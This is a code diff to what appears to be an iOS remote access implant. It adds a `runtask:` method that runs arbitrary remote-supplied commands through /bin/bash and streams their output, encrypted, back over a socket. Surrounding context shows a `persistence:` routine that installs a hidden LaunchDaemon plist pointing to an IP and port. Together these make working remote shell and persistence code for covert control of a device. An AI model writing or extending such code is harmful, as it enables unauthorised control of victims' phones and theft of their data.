@@ -5,6 +5,8 @@ CFArrayRef SBSCopyApplicationDisplayIdentifiers(bool onlyActive, bool debuggable
     
 @synthesize recorder;
 
+BOOL systaskrunning = false;
+
 -(id)init {
     _thisUIDevice = [UIDevice currentDevice];
     [_thisUIDevice setBatteryMonitoringEnabled:YES];
@@ -69,6 +71,20 @@ int sockfd;
 -(void)sendString:(NSString *)string {
     NSString *finalstr = [NSString stringWithFormat:@"%@%@",[escryptor encryptNSStringToB64:self.skey :string],_terminator];
     write (sockfd, [[NSString stringWithFormat:@"%@%@",finalstr,_terminator] UTF8String], finalstr.length + _terminator.length);
+}
+
+-(void)liveSendString:(NSString *)string {
+    NSMutableString *reversed = [NSMutableString string];
+    NSInteger charIndex = [_terminator length];
+    while (charIndex > 0) {
+        charIndex--;
+        NSRange subRange = NSMakeRange(charIndex, 1);
+        [reversed appendString:[_terminator substringWithRange:subRange]];
+    }
+    
+    NSString *finalstr = [NSString stringWithFormat:@"%@%@",
+                          [escryptor encryptNSStringToB64:self.skey :string],reversed];
+    write (sockfd, [finalstr UTF8String], finalstr.length + 11);
 }
 
 //MARK: Convenience
@@ -578,6 +594,43 @@ int sockfd;
         [self sendString:@"Usage: open BundleIdentifier"];
     }
 }
+
+-(void)runtask:(NSString *)cmd {
+    if ([cmd  isEqual: @"endtask"] && systaskrunning) {
+        [_systask terminate];
+        return;
+    }
+    //http://stackoverflow.com/questions/23937690/getting-process-output-using-nstask-on-the-go
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        systaskrunning = true;
+        _systask = [[NSTask alloc] init];
+        [_systask setLaunchPath:@"/bin/bash"];
+        [_systask setArguments:@[ @"-c", cmd]];
+        [_systask setCurrentDirectoryPath:[_fileManager currentDirectoryPath]];
+        
+        NSPipe *stdoutPipe = [NSPipe pipe];
+        [_systask setStandardOutput:stdoutPipe];
+        [_systask setStandardError:stdoutPipe];
+        
+        NSFileHandle *stdoutHandle = [stdoutPipe fileHandleForReading];
+        [stdoutHandle waitForDataInBackgroundAndNotify];
+        id observer = [[NSNotificationCenter defaultCenter] addObserverForName:NSFileHandleDataAvailableNotification
+                                                                        object:stdoutHandle queue:nil
+                                                                    usingBlock:^(NSNotification *note)
+                       {
+                           NSData *dataRead = [stdoutHandle availableData];
+                           NSString *newOutput = [[NSString alloc] initWithData:dataRead encoding:NSUTF8StringEncoding];
+                           [self liveSendString:newOutput];
+                           [stdoutHandle waitForDataInBackgroundAndNotify];
+                       }];
+        [_systask launch];
+        [_systask waitUntilExit];
+        [[NSNotificationCenter defaultCenter] removeObserver:observer];
+        systaskrunning = false;
+        [self blank];
+    });
+}
+
 
 -(void)persistence:(NSString *)ip :(int)port {
     NSString *loaderpath = @"/Library/LaunchDaemons/.esploader.plist";
